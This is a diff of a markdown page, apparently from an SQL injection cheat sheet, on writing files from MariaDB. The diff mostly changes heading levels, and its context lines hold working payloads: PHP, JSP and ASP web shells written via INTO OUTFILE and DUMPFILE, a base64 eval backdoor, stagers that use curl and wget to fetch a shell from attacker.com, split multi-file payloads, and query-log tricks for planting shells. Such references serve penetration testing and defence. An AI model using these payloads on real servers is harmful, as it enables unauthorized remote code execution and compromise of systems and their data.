@@ -7,11 +7,9 @@ tags: ["file operations", "outfile", "dumpfile", "web shell"]
 lastUpdated: 2025-12-18
 ---
 
-## Writing Files
-
 MariaDB provides functionality to write data to files on the server's filesystem, which can be exploited during SQL injection attacks if the database user has sufficient privileges.
 
-### Prerequisites
+## Prerequisites
 
 To write files from MariaDB, the following conditions must be met:
 
@@ -20,7 +18,7 @@ To write files from MariaDB, the following conditions must be met:
 3. You must know the absolute path where you want to write
 4. The `secure_file_priv` setting must either be empty or set to a directory where you can write
 
-### Important Constraints
+## Important Constraints
 
 | Constraint         | Description                                                                                                                              |
 | ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------- |
@@ -29,11 +27,11 @@ To write files from MariaDB, the following conditions must be met:
 | Pathname Quoting   | File paths must be quoted string literals (e.g., `'/path/to/file'`); hex notation (`0x...`) that works elsewhere in SQL is not supported |
 | Max Packet Size    | Limited by `@@max_allowed_packet`                                                                                                        |
 
-### Methods for Writing Files
+## Methods for Writing Files
 
 MariaDB provides two primary statements for writing to files:
 
-#### SELECT INTO OUTFILE
+### SELECT INTO OUTFILE
 
 Writes a result set to a file, adding newlines between rows and field separators between columns:
 
@@ -60,7 +58,7 @@ INTO OUTFILE '/tmp/ids.txt'
 LINES TERMINATED BY '\r\n'
 ```
 
-#### SELECT INTO DUMPFILE
+### SELECT INTO DUMPFILE
 
 Writes a result set to a file without any formatting (better for binary data and web shells):
 
@@ -83,11 +81,11 @@ SELECT id FROM users LIMIT 2 INTO DUMPFILE '/tmp/test.bin'
 -- Error: Result consisted of more than one row
 ```
 
-### Checking for FILE Privilege
+## Checking for FILE Privilege
 
 > **Note:** See [Privileges](/mariadb/privileges) for detailed FILE privilege checking queries.
 
-### Checking secure_file_priv Setting
+## Checking secure_file_priv Setting
 
 > **Note:** See [Privileges](/mariadb/privileges) for detailed secure_file_priv explanation and values.
 
@@ -110,11 +108,11 @@ SELECT
   @@max_allowed_packet AS max_packet
 ```
 
-### Writing a Web Shell
+## Writing a Web Shell
 
 One of the most common exploits is writing a web shell to gain remote code execution:
 
-#### PHP Web Shell
+### PHP Web Shell
 
 ```sql
 SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
@@ -123,19 +121,19 @@ SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
 SELECT '<?php $c=$_GET["c"]; if(isset($c)) { eval(base64_decode($c)); } ?>' INTO OUTFILE '/var/www/html/images/blank.php';
 ```
 
-#### JSP Web Shell
+### JSP Web Shell
 
 ```sql
 SELECT '<%@ page import="java.util.*,java.io.*"%><% Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); %>' INTO OUTFILE '/var/lib/tomcat/webapps/ROOT/shell.jsp';
 ```
 
-#### ASP Web Shell
+### ASP Web Shell
 
 ```sql
 SELECT '<%Response.Write(CreateObject("WScript.Shell").exec(Request.QueryString("cmd")).StdOut.ReadAll())%>' INTO OUTFILE 'C:/inetpub/wwwroot/shell.asp';
 ```
 
-### Writing Multiple Lines
+## Writing Multiple Lines
 
 For multiline content, you can use string concatenation and CHAR():
 
@@ -158,7 +156,7 @@ SELECT CONCAT_WS(CHAR(10),
 ) INTO DUMPFILE '/var/www/html/shell.php'
 ```
 
-#### Special Characters Reference
+### Special Characters Reference
 
 | Character       | CHAR() Value | Description      |
 | --------------- | ------------ | ---------------- |
@@ -168,7 +166,7 @@ SELECT CONCAT_WS(CHAR(10),
 | Space           | `CHAR(32)`   | Space            |
 | Null byte       | `CHAR(0)`    | Binary null      |
 
-### Finding Writable Directories
+## Finding Writable Directories
 
 Common writable directories:
 
@@ -196,7 +194,7 @@ SELECT @@tmpdir AS tmpdir
 SHOW VARIABLES WHERE Variable_name LIKE '%file%' OR Variable_name LIKE '%dir%'
 ```
 
-### MariaDB-Specific Syntax Tolerance
+## MariaDB-Specific Syntax Tolerance
 
 MariaDB is sometimes more permissive with INTO OUTFILE positioning. It may accept:
 
@@ -207,11 +205,11 @@ SELECT 1 INTO OUTFILE '/tmp/test.txt' WHERE 1=0
 
 However, standard practice is to place INTO OUTFILE at the end of the query.
 
-### Payload Delivery Techniques
+## Payload Delivery Techniques
 
 When query length is limited (e.g., by application input validation or `@@max_allowed_packet`), write a small stager to fetch the full payload.
 
-#### PHP Downloader
+### PHP Downloader
 
 Write a minimal PHP script that downloads and writes a larger shell:
 
@@ -234,7 +232,7 @@ SELECT '<?php shell_exec("curl -o /var/www/html/shell.php http://attacker.com/sh
 SELECT '<?php shell_exec("wget -O /var/www/html/shell.php http://attacker.com/shell.txt");?>' INTO OUTFILE '/var/www/html/dl.php';
 ```
 
-#### Staged SQL Injection
+### Staged SQL Injection
 
 If no outbound network access is available, stage the payload via multiple SQL injection writes:
 
@@ -249,9 +247,9 @@ SELECT '"c3lzdGVtKCRfR0VUWydjJ10pOw=="; $a($b); ?>' INTO OUTFILE '/var/www/html/
 SELECT '<?php include"/var/www/html/p1.txt";include"/var/www/html/p2.txt";?>' INTO OUTFILE '/var/www/html/shell.php';
 ```
 
-### Overcoming Restrictions
+## Overcoming Restrictions
 
-#### When secure_file_priv is set
+### When secure_file_priv is set
 
 If `secure_file_priv` is set to a specific directory, you're limited to writing there:
 
@@ -260,7 +258,7 @@ If `secure_file_priv` is set to a specific directory, you're limited to writing 
 SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/lib/mysql-files/shell.php';
 ```
 
-#### File Already Exists
+### File Already Exists
 
 Since INTO OUTFILE cannot overwrite files, use unique filenames:
 
@@ -269,9 +267,9 @@ Since INTO OUTFILE cannot overwrite files, use unique filenames:
 SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell_20251218.php';
 ```
 
-### Practical Examples
+## Practical Examples
 
-#### Writing a Simple Backdoor
+### Writing a Simple Backdoor
 
 ```sql
 -- Check where we can write
@@ -282,9 +280,9 @@ SELECT '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; system($_REQUEST["cmd"]
 INTO DUMPFILE '/var/www/html/images/1.php'
 ```
 
-### Injection Context Examples
+## Injection Context Examples
 
-#### UNION with INTO OUTFILE
+### UNION with INTO OUTFILE
 
 ```sql
 -- In real injection, extends existing query
@@ -293,7 +291,7 @@ UNION SELECT 1, 'injected data'
 INTO OUTFILE '/tmp/output.txt'
 ```
 
-#### Writing Subquery Results
+### Writing Subquery Results
 
 ```sql
 -- Write query results to file
@@ -301,7 +299,7 @@ SELECT (SELECT GROUP_CONCAT(username) FROM users)
 INTO OUTFILE '/tmp/users.txt'
 ```
 
-#### Writing Hex-Encoded Content
+### Writing Hex-Encoded Content
 
 ```sql
 -- UNHEX converts hex to binary
@@ -310,7 +308,7 @@ INTO DUMPFILE '/tmp/hello.bin'
 -- Writes: "Hello World"
 ```
 
-### Binary Data Writing
+## Binary Data Writing
 
 ```sql
 -- Write binary using UNHEX
@@ -328,7 +326,7 @@ SELECT CONCAT(
 ) INTO DUMPFILE '/tmp/shell.php'
 ```
 
-### Error Message Analysis
+## Error Message Analysis
 
 Common errors when writing files:
 
@@ -345,11 +343,11 @@ Common errors when writing files:
 SELECT 'test' INTO OUTFILE '/tmp/write_test.txt'
 ```
 
-### Alternative Writing Methods
+## Alternative Writing Methods
 
 When INTO OUTFILE/DUMPFILE is blocked, consider log file manipulation:
 
-#### General Log File Trick
+### General Log File Trick
 
 Requires SUPER privilege to modify log settings:
 
@@ -368,7 +366,7 @@ SELECT '<?php system($_GET["cmd"]); ?>'
 SET GLOBAL general_log = 0
 ```
 
-#### Slow Query Log Trick
+### Slow Query Log Trick
 
 ```sql
 -- Check slow query log settings
@@ -385,7 +383,7 @@ SELECT '<?php system($_GET["cmd"]); ?>' AND SLEEP(1)
 
 **Note:** These require SUPER privilege which is typically not available.
 
-### Mitigation
+## Mitigation
 
 To prevent unauthorized file writing:
 
